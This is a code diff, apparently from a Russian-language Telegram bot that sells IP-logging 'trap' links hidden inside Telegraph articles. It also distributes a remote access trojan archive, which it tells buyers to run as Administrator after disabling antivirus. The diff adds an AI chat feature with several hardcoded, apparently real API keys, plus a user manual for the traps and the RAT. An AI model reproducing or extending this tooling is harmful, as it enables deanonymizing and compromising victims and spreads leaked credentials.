@@ -7,11 +7,12 @@ import sqlite3
 import urllib.parse
 import threading
 import requests
+import tempfile
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
 
 import telebot
-from telebot import types
+from telebot import types, formatting
 from telegraph import Telegraph
 
 # ---------- CONFIG ----------
@@ -22,7 +23,7 @@ ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").spl
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
 WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 
-# ВАЖНО: Убрали /tmp/, чтобы база не удалялась при редеплое!
+# ВАЖНО: База теперь лежит в корне, а не в /tmp
 DB_PATH     = os.environ.get("DB_PATH") or "database2.db" 
 PORT        = int(os.environ.get("PORT", 8080))
 
@@ -33,6 +34,11 @@ REF_REWARD    = 0.1
 REF_MARKUP    = 0.5
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
 RAT_URL       = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
+
+# API КЛЮЧИ
+OPENROUTER_KEY = "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"
+KIMI_KEY       = "sk-w0I4rlR4gqX5pptrLh1b7Eh7OhwgpaKtufweR1c58RJYHoQ9"
+GOOGLE_KEY     = "AQ.Ab8RN6KhJs9xiYkDT21RNZ86ktVdojwSgLrAUIUYmgvnhp9piA"
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -57,6 +63,7 @@ def db_init():
         CREATE TABLE IF NOT EXISTS links (slug TEXT PRIMARY KEY, title TEXT, created_by INTEGER, created_at INTEGER, hits INTEGER DEFAULT 0);
         CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
         CREATE TABLE IF NOT EXISTS rtc_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, real_ip TEXT, ua TEXT, ts INTEGER);
+        CREATE TABLE IF NOT EXISTS ai_usage (user_id INTEGER, date TEXT, count INTEGER DEFAULT 0, PRIMARY KEY (user_id, date));
         """)
         cols = [r["name"] for r in c.execute("PRAGMA table_info(users)").fetchall()]
         if "ref_balance" not in cols:
@@ -80,8 +87,7 @@ def register(user_id, username, ref_id=0):
     with _conn() as c:
         user = c.execute("SELECT referrer_id, ref_rewarded FROM users WHERE user_id=?", (user_id,)).fetchone()
         if not user:
-            c.execute("INSERT INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", 
-                      (user_id, username, datetime.now().isoformat(), int(ref_id)))
+            c.execute("INSERT INTO users (user_id, username, created_at, referrer_id) VALUES (?,?,?,?)", (user_id, username, datetime.now().isoformat(), int(ref_id)))
         else:
             if user["referrer_id"] == 0 and int(ref_id) != 0 and user["ref_rewarded"] == 0:
                 c.execute("UPDATE users SET referrer_id=? WHERE user_id=?", (int(ref_id), user_id))
@@ -153,7 +159,21 @@ def get_user_links(user_id, limit=10):
 def get_all_links(limit=30):
     with _conn() as c: return c.execute("SELECT l.*, u.username FROM links l LEFT JOIN users u ON l.created_by = u.user_id ORDER BY l.created_at DESC LIMIT ?", (limit,)).fetchall()
 
-# ---------- UTIL ----------
+# --- НЕЙРОСЕТЬ ЛОГИКА ---
+def check_ai_limit(user_id):
+    today = datetime.now().strftime("%Y-%m-%d")
+    with _conn() as c:
+        r = c.execute("SELECT count FROM ai_usage WHERE user_id=? AND date=?", (user_id, today)).fetchone()
+        used = r["count"] if r else 0
+        max_limit = 15 if is_premium(user_id) else 5
+        return used, max_limit
+
+def increment_ai_limit(user_id):
+    today = datetime.now().strftime("%Y-%m-%d")
+    with _conn() as c:
+        c.execute("INSERT INTO ai_usage (user_id, date, count) VALUES (?,?,1) ON CONFLICT(user_id, date) DO UPDATE SET count = count + 1", (user_id, today))
+
+# ---------- УТИЛИТЫ ----------
 def check_sub(user_id):
     try:
         status = bot.get_chat_member(CHANNEL_ID, user_id).status
@@ -165,8 +185,7 @@ def send_log(text):
     except Exception as e: print(f"[!] Log error: {e}")
 
 def slug_gen(n=8):
-    a = string.ascii_letters + string.digits
-    return "".join(secrets.choice(a) for _ in range(n))
+    return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(n))
 
 def make_trap_link(title, created_by, creator_username, is_prem):
     slug_len = 10 if is_prem else 8
@@ -186,47 +205,36 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     html = build_html(text, trap_url, img_url)
     page = telegraph.create_page(title=title, html_content=html)
     url = f"https://telegra.ph/{page['path']}"
-    
     msg = f"<b>⭐️Статья создана</b>\n=============================\nТема: {title}\nСсылка: {url}"
     return msg, url, slug
 
-# ---------- ФУНКЦИЯ ОТПРАВКИ RAT (ЧЕРЕЗ FILE_ID, БЕЗ НАГРУЗКИ) ----------
 def send_rat_file(chat_id, msg_id=None):
     file_id = get_setting("rat_file_id")
     caption = "🦠 <b>Ваш RAT-клиент</b>\n\n<b>Инструкция:</b>\n1. Скачайте архив и распакуйте (пароль: <code>123</code>).\n2. Отключите антивирус.\n3. Запустите <code>SystemUpdate.exe</code> от имени Администратора."
-    
     if file_id:
         try:
             bot.send_document(chat_id, file_id, caption=caption)
             if msg_id: bot.delete_message(chat_id, msg_id)
             return
-        except Exception:
-            pass # Если file_id протух, скачиваем заново
+        except Exception: pass 
             
-    # Если file_id нет, качаем в фоне (чтобы не вешать бота)
     msg = bot.send_message(chat_id, "⏳ Скачиваю архив (первый раз)...")
     def download_task():
+        tmp_path = None
         try:
-            # Качаем на диск, чтобы не жрать RAM
             r = requests.get(RAT_URL, stream=True, timeout=60)
             r.raise_for_status()
-            
-            with open("SystemUpdate.7z", "wb") as f:
-                for chunk in r.iter_content(chunk_size=8192):
-                    f.write(chunk)
-            
-            with open("SystemUpdate.7z", "rb") as f:
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".7z") as tmp:
+                tmp_path = tmp.name
+                for chunk in r.iter_content(chunk_size=8192): tmp.write(chunk)
+            with open(tmp_path, "rb") as f:
                 sent_msg = bot.send_document(chat_id, f, caption=caption)
-                
-            # Сохраняем file_id в БД, чтобы больше не качать
-            if sent_msg.document:
-                set_setting("rat_file_id", sent_msg.document.file_id)
-                
-            os.remove("SystemUpdate.7z")
+            if sent_msg.document: set_setting("rat_file_id", sent_msg.document.file_id)
             bot.delete_message(chat_id, msg.message_id)
         except Exception as e:
             bot.edit_message_text(f"❌ Ошибка скачивания: {e}", chat_id, msg.message_id)
-
+        finally:
+            if tmp_path and os.path.exists(tmp_path): os.remove(tmp_path)
     threading.Thread(target=download_task).start()
 
 # ---------- WEBHOOK ----------
@@ -266,13 +274,14 @@ def run_webhook():
     print(f"[*] Webhook server on port {PORT}")
     web_app.run(host="0.0.0.0", port=PORT, threaded=True, use_reloader=False)
 
-# ---------- MENUS ----------
+# ---------- МЕНЮ ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(types.InlineKeyboardButton("⭐️ Наш канал", url=CHANNEL_LINK))
-    kb.add(types.InlineKeyboardButton("📙 Мануалы", url='https://t.me/c/2133502681/33'))
+    kb.add(types.InlineKeyboardButton("📙 Мануалы", callback_data='manual'))
     kb.add(types.InlineKeyboardButton("📙 Профиль", callback_data='cabinet'))
     kb.add(types.InlineKeyboardButton("🌟 Создать логгер", callback_data='logger'))
+    kb.add(types.InlineKeyboardButton("🤖 Нейросеть (AI)", callback_data='ai_menu'))
     
     prem = " 💎" if is_premium(uid) else ""
     with open('had2.jpg', 'rb') as had:
@@ -325,13 +334,110 @@ def cb_check_sub(call):
         if user["referrer_id"] != 0 and user["ref_rewarded"] == 0:
             add_ref_balance(user["referrer_id"], REF_REWARD)
             set_ref_rewarded(uid)
-            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$")
+            try: bot.send_message(user["referrer_id"], f"🎉 По твоей ссылке зашел новый юзер! Тебе начислено +{REF_REWARD}$ на реф. баланс.")
             except: pass
-            
         bot.delete_message(call.message.chat.id, call.message.message_id)
         show_main_menu(uid)
     else:
         bot.answer_callback_query(call.id, "❌ Ты не подписался!", show_alert=True)
+
+# ---------- AI (НЕЙРОСЕТЬ) ----------
+@bot.callback_query_handler(func=lambda c: c.data == 'ai_menu')
+def cb_ai_menu(call):
+    used, max_limit = check_ai_limit(call.from_user.id)
+    left = max_limit - used
+    
+    text = (
+        f"<b>🤖 Нейросеть</b>\n"
+        f"=============================\n"
+        f"Твой лимит: <b>{left}/{max_limit}</b> запросов на сегодня.\n"
+        f"(Premium дает 15 запросов, обычным 5).\n\n"
+        f"<b>Выбери модель для общения:</b>"
+    )
+    
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(types.InlineKeyboardButton("🦙 Llama 3 (OpenRouter)", callback_data="ask_llama"))
+    kb.add(types.InlineKeyboardButton("🌙 Kimi (Moonshot)", callback_data="ask_kimi"))
+    kb.add(types.InlineKeyboardButton("✨ Gemini (Google)", callback_data="ask_gemini"))
+    kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
+    
+    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=text, reply_markup=kb)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda c: c.data.startswith('ask_'))
+def cb_ask_ai(call):
+    model = call.data.split('_')[1]
+    used, max_limit = check_ai_limit(call.from_user.id)
+    
+    if used >= max_limit:
+        return bot.answer_callback_query(call.id, f"❌ Лимит {max_limit} запросов исчерпан! Купи Premium.", show_alert=True)
+        
+    msg = bot.send_message(call.from_user.id, f"<b>Выбрана модель: {model.upper()}</b>\n\nВведи свой вопрос или задачу (или /start для отмены):")
+    bot.register_next_step_handler(msg, process_ai_request, model)
+    bot.answer_callback_query(call.id)
+
+def process_ai_request(message, model):
+    uid = message.from_user.id
+    prompt = message.text
+    
+    if not prompt: return
+    
+    if prompt.startswith('/'):
+        return bot.reply_to(message, "❌ Запрос отменен.")
+    
+    used, max_limit = check_ai_limit(uid)
+    if used >= max_limit:
+        return bot.reply_to(message, "❌ Лимит исчерпан!")
+        
+    msg = bot.reply_to(message, "⏳ <i>Думаю...</i>")
+    
+    try:
+        answer = "Ошибка."
+        if model == "llama":
+            res = requests.post(
+                url="https://openrouter.ai/api/v1/chat/completions",
+                headers={"Authorization": f"Bearer {OPENROUTER_KEY}", "Content-Type": "application/json"},
+                json={"model": "meta-llama/llama-3-8b-instruct", "messages": [{"role": "user", "content": prompt}]},
+                timeout=25
+            )
+            if res.ok: answer = res.json()["choices"][0]["message"]["content"]
+            else: answer = f"Ошибка API (код {res.status_code})"
+            
+        elif model == "kimi":
+            res = requests.post(
+                url="https://api.moonshot.cn/v1/chat/completions",
+                headers={"Authorization": f"Bearer {KIMI_KEY}", "Content-Type": "application/json"},
+                json={"model": "moonshot-v1-8k", "messages": [{"role": "user", "content": prompt}]},
+                timeout=25
+            )
+            if res.ok: answer = res.json()["choices"][0]["message"]["content"]
+            else: answer = f"Ошибка API (код {res.status_code})"
+            
+        elif model == "gemini":
+            res = requests.post(
+                url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key={GOOGLE_KEY}",
+                json={"contents": [{"parts": [{"text": prompt}]}]},
+                timeout=25
+            )
+            if res.ok: 
+                answer = res.json()["candidates"][0]["content"]["parts"][0]["text"]
+            else: 
+                answer = f"Ошибка API (код {res.status_code})"
+            
+        # Защита от падения HTML-парсера Telegram
+        safe_answer = formatting.escape_html(answer)
+        
+        if len(safe_answer) > 4000: 
+            safe_answer = safe_answer[:4000] + "... (обрезано)"
+            
+        # Списываем лимит ТОЛЬКО если ответ успешный
+        if not answer.startswith("Ошибка"):
+            increment_ai_limit(uid)
+            
+        bot.edit_message_text(f"<b>🤖 {model.upper()}:</b>\n\n{safe_answer}", chat_id=uid, message_id=msg.message_id, disable_web_page_preview=True)
+        
+    except Exception as e:
+        bot.edit_message_text(f"❌ Ошибка сети: {e}", chat_id=uid, message_id=msg.message_id)
 
 # ---------- CALLBACKS ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'home')
@@ -458,6 +564,21 @@ def cb_get_rat_exe(call):
     bot.answer_callback_query(call.id)
     send_rat_file(call.from_user.id)
 
+# ---------- МАНУАЛ ----------
+@bot.callback_query_handler(func=lambda c: c.data == 'manual')
+def cb_manual(call):
+    text = (
+        "<b>📙 ПОЛНЫЙ МАНУАЛ</b>\n"
+        "=============================\n"
+        "<b>1. Ловушки:</b> Жми «Создать логгер», выбери шаблон. Получишь ссылку на Telegraph. Ловушка скрыта внутри.\n\n"
+        "<b>2. RAT:</b> Скачивай в профиле (только Premium). Пароль от архива: <code>123</code>.\n"
+        "Запускать <code>.exe</code> только на Windows (от имени Админа).\n\n"
+        "<b>3. Нейросеть:</b> Жми «🤖 Нейросеть». Доступно 5 запросов в день (15 с Premium). Выбирай модель и пиши вопрос."
+    )
+    kb = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ Закрыть", callback_data="home"))
+    bot.send_message(call.from_user.id, text, reply_markup=kb, disable_web_page_preview=True)
+    bot.answer_callback_query(call.id)
+
 # ---------- ADMIN ----------
 @bot.message_handler(commands=['admin'])
 def cmd_admin(m): admin_menu(m.chat.id)
@@ -474,6 +595,7 @@ def cb_admin_give(call):
     bot.answer_callback_query(call.id)
 
 def _admin_give_step(message):
+    if message.text.startswith('/'): return bot.send_message(message.chat.id, "Отменено.")
     parts = message.text.split()
     if len(parts) < 2: return
     try: uid, amount = int(parts[0]), float(parts[1])
@@ -506,6 +628,7 @@ def cb_admin_manage_user(call):
     bot.answer_callback_query(call.id)
 
 def _admin_manage_step(message):
+    if message.text.startswith('/'): return bot.send_message(message.chat.id, "Отменено.")
     parts = message.text.split()
     if len(parts) < 2: return
     try: uid = int(parts[0])
@@ -538,6 +661,7 @@ def cb_admin_bc(call):
     bot.answer_callback_query(call.id)
 
 def _admin_bc_step(message):
+    if message.text.startswith('/'): return bot.send_message(message.chat.id, "Отменено.")
     ok = fail = 0
     for uid in all_user_ids():
         try: bot.send_message(uid, message.text); ok += 1
@@ -624,6 +748,9 @@ def cb_template(call):
     bot.answer_callback_query(call.id)
 
 def _ask_img(message):
+    if message.text.startswith('/'):
+        bot.send_message(message.chat.id, "❌ Создание отменено.")
+        return show_main_menu(message.chat.id)
     key = _pending.get(message.from_user.id)
     if not key: return
     title = message.text.strip()[:80]
@@ -650,6 +777,9 @@ def cb_custom(call):
 _custom = {}
 
 def _cust_title(message):
+    if message.text.startswith('/'):
+        bot.send_message(message.chat.id, "❌ Создание отменено.")
+        return show_main_menu(message.chat.id)
     _custom[message.from_user.id] = {"title": message.text.strip()[:80]}
     bot.send_message(message.chat.id, "<b>Введите текст:</b>")
     bot.register_next_step_handler(message, _cust_text)
